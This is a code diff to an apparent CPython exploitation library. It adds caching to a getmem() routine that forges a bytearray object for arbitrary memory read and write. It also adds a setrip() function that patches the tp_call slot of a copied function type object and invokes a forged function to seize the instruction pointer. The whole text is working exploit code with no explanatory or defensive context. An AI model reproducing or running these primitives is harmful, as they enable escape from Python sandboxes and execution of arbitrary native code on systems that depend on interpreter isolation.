@@ -32,6 +32,7 @@ def addrof(obj):
 
 def refbytes(data):
 	# get the address of the internal buffer of a bytes object
+	nogc.add(data) # unnecessary?
 	return addrof(data) + BYTES_HEADER_LEN
 
 
@@ -118,7 +119,12 @@ def fakeobj(addr):
 	return magic
 
 
+mem = None # cache the result
 def getmem():
+	global mem
+	if mem:
+		return mem
+	
 	fake_bytearray = bytes(p64a(
 		1,
 		id(bytearray),
@@ -126,4 +132,23 @@ def getmem():
 		0, 0, 0, 0
 	))
 	
-	return fakeobj(refbytes(fake_bytearray))
+	mem = fakeobj(refbytes(fake_bytearray))
+	return mem
+
+
+def setrip(addr):
+	# make a copy of the built-in function type object
+	my_functype = getmem()[id(FunctionType):id(FunctionType)+0x800]
+
+	# patch tp_call
+	my_functype[0x80:0x88] = p64a(addr)
+
+	# get a pointer to our patched function type
+	my_functype_ptr = refbytes(bytes(my_functype))
+
+	# create an instance of our custom function object
+	my_func_ptr = refbytes(bytes(p64a(0xcafebabe-2, my_functype_ptr))+bytes(0x100))
+	my_func = fakeobj(my_func_ptr)
+
+	# call it!
+	return my_func()
